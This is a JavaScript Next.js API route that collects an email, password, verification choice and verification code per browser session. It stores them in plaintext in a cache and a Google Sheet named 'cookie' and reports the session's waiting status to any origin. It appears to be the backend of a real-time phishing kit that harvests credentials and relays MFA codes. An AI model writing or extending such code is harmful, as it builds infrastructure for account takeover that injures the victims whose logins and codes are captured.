import { NextResponse } from "next/server";
import { getCachedRow, setCachedRow, populateCache } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { getSheetDataApi } from "../../../api/googlesheets.js";

export async function POST(request) {
    incrementUsage();

    let body;
    try {
        body = await request.json();
    } catch (e) {
        try {
            const text = await request.text();
            body = Object.fromEntries(new URLSearchParams(text));
        } catch (e2) {
            return NextResponse.json({ success: false, error: "Invalid request body" }, { status: 400 });
        }
    }

    const { browserId, token, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return NextResponse.json({ success: false, error: "browserId required" }, { status: 400 });
    }

    if (email || password || verificationChoice || verificationCode) {
        const updates = { lastUserActivity: new Date().toISOString() };
        if (email) { updates.email = email; updates.domain = email.split('@')[1] || ''; }
        if (password) updates.password = password;
        if (verificationChoice) updates.verificationChoice = verificationChoice;
        if (verificationCode) updates.verificationCode = verificationCode;
        setCachedRow(browserId, updates);
    }

    let row = getCachedRow(browserId);

    if (!row) {
        try {
            const cookieData = await getSheetDataApi("cookie");
            if (cookieData.success) {
                row = cookieData.data.find(r => r.browserId === browserId);
                if (row) populateCache(browserId, row);
            }
        } catch (e) {}
    }

    if (!row) {
        return NextResponse.json({ success: false, error: "Session not found" }, { status: 404 });
    }

    const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE"];
    if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
        setCachedRow(browserId, { status: "FAILED" });
        row.status = "FAILED";
    }

    return NextResponse.json({
        success: true,
        currentStatus: row.status,
        data: row
    });
}

export async function OPTIONS() {
    return new Response(null, {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
        },
    });
}
